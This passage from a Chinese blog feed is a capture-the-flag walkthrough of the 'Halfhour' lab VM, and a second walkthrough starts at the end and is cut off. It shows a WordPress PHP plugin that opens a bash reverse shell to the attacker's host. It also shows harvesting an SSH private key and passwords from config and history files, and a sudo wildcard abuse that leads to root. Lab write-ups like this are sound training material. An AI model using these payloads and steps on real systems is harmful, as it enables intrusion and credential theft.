class="hljs-string">1338/tcp open  wmc-log-svc</span><br><span class="hljs-string">MAC Address: 08:00:27:F7:91:CD (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.58 seconds</span><br></code></pre></td></tr></table></figure><p>没有有用的信息</p><h1 id="二、漏洞利用与凭证获取"><a href="#二、漏洞利用与凭证获取" class="headerlink" title="二、漏洞利用与凭证获取"></a>二、漏洞利用与凭证获取</h1><h2 id="1、探测未知的端口"><a href="#1、探测未知的端口" class="headerlink" title="1、探测未知的端口"></a>1、探测未知的端口</h2><h3 id="1-1337端口"><a href="#1-1337端口" class="headerlink" title="1.1337端口"></a>1.1337端口</h3><p>使用<code>nc</code>连接<code>1377端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nc 192.168.2.14 1337<br>Please enter password: miao<br>Incorrect password. Attempts left: 2<br>miao<br>Incorrect password. Attempts left: 1<br>miao<br>Too many failed attempts. Reset password? (<span class="hljs-built_in">yes</span>/no)<span class="hljs-built_in">yes</span><br>Please send new password to port 1338.<br></code></pre></td></tr></table></figure><p>发现是一个密码验证服务，并提示可以在<code>1338</code>重置密码</p><h3 id="2-1338端口"><a href="#2-1338端口" class="headerlink" title="2.1338端口"></a>2.1338端口</h3><p>使用<code>nc</code>连接<code>1338端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nc 192.168.2.14 1338<br>Please send new password: miao<br>Congratulations! Password reset successful!<br>Old password: bobobo<br></code></pre></td></tr></table></figure><p>提示密码重置成功，并返回旧的密码<code>bobobo</code></p><p>再次访问<code>1337端口</code>，并输入重置的密码，发现密码依然是错误的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nc 192.168.2.14 1337<br>Please enter password: miao<br>Incorrect password. Attempts left: 2<br></code></pre></td></tr></table></figure><p>尝试输入旧密码<code>bobobo</code>，提示密码正确，找到一个凭证<code>bobobo</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nc 192.168.2.14 1337<br>Please enter password: bobobo<br>Password correct!<br></code></pre></td></tr></table></figure><h2 id="2、web渗透-80端口"><a href="#2、web渗透-80端口" class="headerlink" title="2、web渗透-80端口"></a>2、web渗透-80端口</h2><p>访问80端口服务，找到一个域名<code>halfhour.dsz</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# curl http://192.168.2.14                                             <br>&lt;!-- halfhour.dsz --&gt;<br>...<br></code></pre></td></tr></table></figure><p>将域名加入到<code>hosts</code>文件后再次访问，发现是<code>wordpress</code>框架搭建的服务<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509181431126.png"></p><h2 id="3、WordPress渗透"><a href="#3、WordPress渗透" class="headerlink" title="3、WordPress渗透"></a>3、WordPress渗透</h2><p>在<code>您好，世界！</code>里面找到一个用户名<code>todd</code>，结合刚才获取到的密码凭证<code>bobobo</code>，尝试登录后台<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509181435749.png"></p><p>成功进入后台，WordPress版本为<code>6.8.2</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509181436219.png"></p><p>在<code>插件</code>处可以上传一个反弹shell的插件包，并且安装启用<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509181439844.png"></p><p>WordPress反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>/**<br> * Plugin Name: Reverse Shell Plugin<br> * Plugin URI: <br> * Description: Reverse Shell Plugin <span class="hljs-keyword">for</span> penetration testing.<br> * Version: 1.0<br> * Author: Security Analyst<br> * Author URI: http://www.example.com<br> */<br><span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.4/4444 0&gt;&amp;1&#x27;&quot;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><h1 id="三、获取www-data权限"><a href="#三、获取www-data权限" class="headerlink" title="三、获取www-data权限"></a>三、获取www-data权限</h1><p>在kali开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nc -lvnp 4444       <br>listening on [any] 4444 ...<br></code></pre></td></tr></table></figure><p>安装插件，并启用插件，成功获得shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nc -lvnp 4444       <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.14] 58048<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (436): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@Halfhour:/var/www/halfhour.dsz/wp-admin$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取nxal权限（兔子洞）"><a href="#1、获取nxal权限（兔子洞）" class="headerlink" title="1、获取nxal权限（兔子洞）"></a>1、获取nxal权限（兔子洞）</h2><p>查看<code>/home</code>下面的目录，找到三个用户，但只对<code>nxal</code>用户具有权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Halfhour:/home$ <span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxr-xr-x  5 root      root      4096 Sep 14 05:20 .<br>drwxr-xr-x 18 root      root      4096 Mar 18  2025 ..<br>drwxr-xr-x  3 nxal      nxal      4096 Sep 14 05:20 nxal<br>drwx------  2 wangjiang wangjiang 4096 Sep 14 05:55 wangjiang<br>drwx------  2 welcome   welcome   4096 Sep 14 05:26 welcome<br></code></pre></td></tr></table></figure><p>在<code>nxal</code>用户下面找到<code>ssh</code>的私钥和公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Halfhour:/home/nxal/.ssh$ <span class="hljs-built_in">ls</span> -la<br>total 16<br>drwxr-xr-x 2 nxal nxal 4096 Sep 14 05:15 .<br>drwxr-xr-x 3 nxal nxal 4096 Sep 14 05:20 ..<br>-rwxr-xr-x 1 nxal nxal 2602 Sep 14 05:15 id_rsa<br>-rwxr-xr-x 1 nxal nxal  567 Sep 14 05:15 id_rsa.pub<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Halfhour:/home/nxal/.ssh$ <span class="hljs-built_in">cat</span> id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>使用<code>nxal</code>的私钥进行登录，成功获取到<code>nxal</code>的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# <span class="hljs-built_in">chmod</span> 600 <span class="hljs-built_in">id</span>           <br><br>┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# ssh nxal@192.168.2.14 -i <span class="hljs-built_in">id</span> <br>nxal@192.168.2.14<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Halfhour 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sun Sep 14 05:50:25 2025 from 192.168.3.94</span><br><span class="hljs-string">nxal@Halfhour:~$ id</span><br><span class="hljs-string">uid=1001(nxal) gid=1001(nxal) groups=1001(nxal)</span><br></code></pre></td></tr></table></figure><h2 id="2、获取wangjiang权限"><a href="#2、获取wangjiang权限" class="headerlink" title="2、获取wangjiang权限"></a>2、获取wangjiang权限</h2><p>查看<code>wordpress</code>的配置文件，找到两个密码<code>root123</code>和<code>your_strong_password</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">nxal@Halfhour:/var/www/halfhour.dsz$ <span class="hljs-built_in">cat</span> wp-config.php <br>...<br>/** Database username */<br>define( <span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;wpuser&#x27;</span> );<br><br>/** Database password */<br>/* define( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;root123&#x27;</span> ); */<br>define( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;your_strong_password&#x27;</span> );<br></code></pre></td></tr></table></figure><p>尝试登录，发现当用户为<code>wangjiang</code>，密码为<code>root123</code>时能成功登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">nxal@Halfhour:/var/www/halfhour.dsz$ su wangjiang<br>Password: <br>wangjiang@Halfhour:/var/www/halfhour.dsz$ <span class="hljs-built_in">id</span><br>uid=1002(wangjiang) gid=1002(wangjiang) <span class="hljs-built_in">groups</span>=1002(wangjiang)<br></code></pre></td></tr></table></figure><h2 id="3、获取welcome权限"><a href="#3、获取welcome权限" class="headerlink" title="3、获取welcome权限"></a>3、获取welcome权限</h2><p>查看<code>wangjiang</code>用户的家目录下面，找到<code>.mysql_history</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">wangjiang@Halfhour:~$ <span class="hljs-built_in">ls</span> -la<br>total 32<br>drwx------ 2 wangjiang wangjiang 4096 Sep 14 05:55 .<br>drwxr-xr-x 5 root      root      4096 Sep 14 05:20 ..<br>-rw-r--r-- 1 wangjiang wangjiang  220 Sep 14 05:20 .bash_logout<br>-rw-r--r-- 1 wangjiang wangjiang 3526 Sep 14 05:20 .bashrc<br>-rw------- 1 wangjiang wangjiang 1516 Sep 14 05:14 .mysql_history<br>-rw-r--r-- 1 root      root        23 Sep 14 05:24 note.txt<br>-rw-r--r-- 1 wangjiang wangjiang  807 Sep 14 05:20 .profile<br>-rw-r--r-- 1 root      root        44 Sep 14 05:14 user.txt<br></code></pre></td></tr></table></figure><p>查看文件，发现<code>welcome</code>用户的密码<code>4c850c5b3b2756e67a91bad8e046ddac</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wangjiang@Halfhour:~$ <span class="hljs-built_in">cat</span> .mysql_history <br>....<br>INSERT\040INTO\040user\040(username,\040password)\040\040VALUES\040(<span class="hljs-string">&#x27;welcome&#x27;</span>,\040<span class="hljs-string">&#x27;4c850c5b3b2756e67a91bad8e046ddac&#x27;</span>)\040ON\040DUPLICATE\040KEY\040UPDATE\040password\040=\040VALUES(password); show\040tables; <span class="hljs-keyword">select</span>\040*\040from\040users; <span class="hljs-keyword">select</span>\040*\040from\040user;<br></code></pre></td></tr></table></figure><p>使用凭证获取<code>welcome</code>的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wangjiang@Halfhour:~$ su welcome<br>Password: <br>welcome@Halfhour:/home/wangjiang$ <span class="hljs-built_in">id</span><br>uid=1000(welcome) gid=1000(welcome) <span class="hljs-built_in">groups</span>=1000(welcome)<br></code></pre></td></tr></table></figure><h2 id="4、获取root权限"><a href="#4、获取root权限" class="headerlink" title="4、获取root权限"></a>4、获取root权限</h2><p>查看<code>sudo</code>权限，找到<code>/usr/local/bin/del.sh</code>不要密码即可执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@Halfhour:/home/wangjiang$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> welcome on Halfhour:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User welcome may run the following commands on Halfhour:<br>    (ALL) NOPASSWD: /usr/local/bin/del.sh<br></code></pre></td></tr></table></figure><p>查看脚本内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@Halfhour:/usr/local/bin$ <span class="hljs-built_in">cat</span> del.sh <br><span class="hljs-comment">#!/bin/bash</span><br><br>PATH=/usr/bin<br><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cat</span> /root/root.txt | <span class="hljs-built_in">tr</span> -d [A-Za-z0-9]<br></code></pre></td></tr></table></figure><p>解释脚本：<br>脚本的意图是读取 <code>/root/root.txt</code> 文件，然后通过<code>tr -d [A-Za-z0-9]</code>命令过滤掉所有的字母和数字，从而隐藏真正的Flag。<br>然而，该脚本存在一个严重的安全缺陷： tr 命令的参数<code> [A-Za-z0-9]</code> 没有被引号包裹。这是一个典型的Shell路径名展开漏洞。</p><ol><li>当Shell执行 tr 命令时，它会先解析命令行参数。</li><li>由于 [A-Za-z0-9] 未加引号，Shell会将其视为一个通配符，意为“匹配当前目录下任意一个由单个字母或数字组成的文件名”。</li><li>脚本中 cd &#x2F;tmp 命令将当前目录切换到了全局可写的 &#x2F;tmp 目录。</li><li>因此，我们可以在 &#x2F;tmp 目录下创建一个文件名恰好能匹配该通配符的文件，例如 A 、 B 或1 。</li><li>当脚本执行时，Shell在 &#x2F;tmp 目录中找到了文件 A ，便会用文件名 A 替换掉通配符 [A-Zaz0-9] 。</li><li>最终，实际执行的命令就从 tr -d [A-Za-z0-9] 变成了 tr -d A 。<br>这样一来，原本要删除所有字母和数字的命令，就变成了只删除字符‘A’的命令。由于Flag中不包含大写字母’A’，因此Flag被完整地打印了出来。</li></ol><p>构造链，成功获取到<code>root</code>的flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@Halfhour:/usr/local/bin$ <span class="hljs-built_in">cd</span> /tmp<br>welcome@Halfhour:/tmp$ <span class="hljs-built_in">touch</span> A<br>welcome@Halfhour:/tmp$ <span class="hljs-built_in">sudo</span> /usr/local/bin/del.sh <br>flag&#123;root-4c850c5b3b2756e67a91bad8e046ddac&#125;<br></code></pre></td></tr></table></figure><p>其实<code>root</code>的密码为<code>bobobo</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@Halfhour:/tmp$ su root<br>Password: <br>root@Halfhour:/tmp# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Halfhour:/tmp# <span class="hljs-built_in">cat</span> /home/wangjiang/user.txt /root/root.txt <br>flag&#123;user-4c850c5b3b2756e67a91bad8e046ddac&#125;<br>flag&#123;root-4c850c5b3b2756e67a91bad8e046ddac&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息泄露</tag>
      
      <tag>wordpress</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crontab</title>
    <link href="/Maze-sec/Crontab/"/>
    <url>/Maze-sec/Crontab/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/crontab]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-09 10:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00077s latency).<br>MAC Address: 0A:00:27:00:00:09 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00056s latency).<br>MAC Address: 08:00:27:EF:C5:4A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.7<br>Host is up (0.0015s latency).<br>MAC Address: 08:00:27:05:3E:D8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.07 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：192.168.2.7</p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/crontab]<br>└─# nmap --min-rate 10000 -p- 192.168.2.7 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-09 10:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.7<br>Host is up (0.00035s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>5000/tcp open  upnp<br>MAC Address: 08:00:27:05:3E:D8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.40 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、5000</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 